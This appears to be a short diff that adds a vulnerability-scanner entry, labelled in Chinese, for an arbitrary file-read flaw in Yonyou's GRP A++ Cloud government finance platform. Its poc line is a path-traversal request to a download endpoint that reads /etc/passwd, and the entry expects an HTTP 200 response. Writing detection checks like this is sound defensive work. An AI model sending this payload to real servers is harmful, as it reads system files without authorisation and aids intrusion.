@@ -1,0 +1,3 @@
+name: "用友GRPA++Cloud政府财务云存在任意文件读取漏洞"
+poc: "/ma/emp/maEmp/download?fileName=../../../etc/passwd"
+status_code: 200
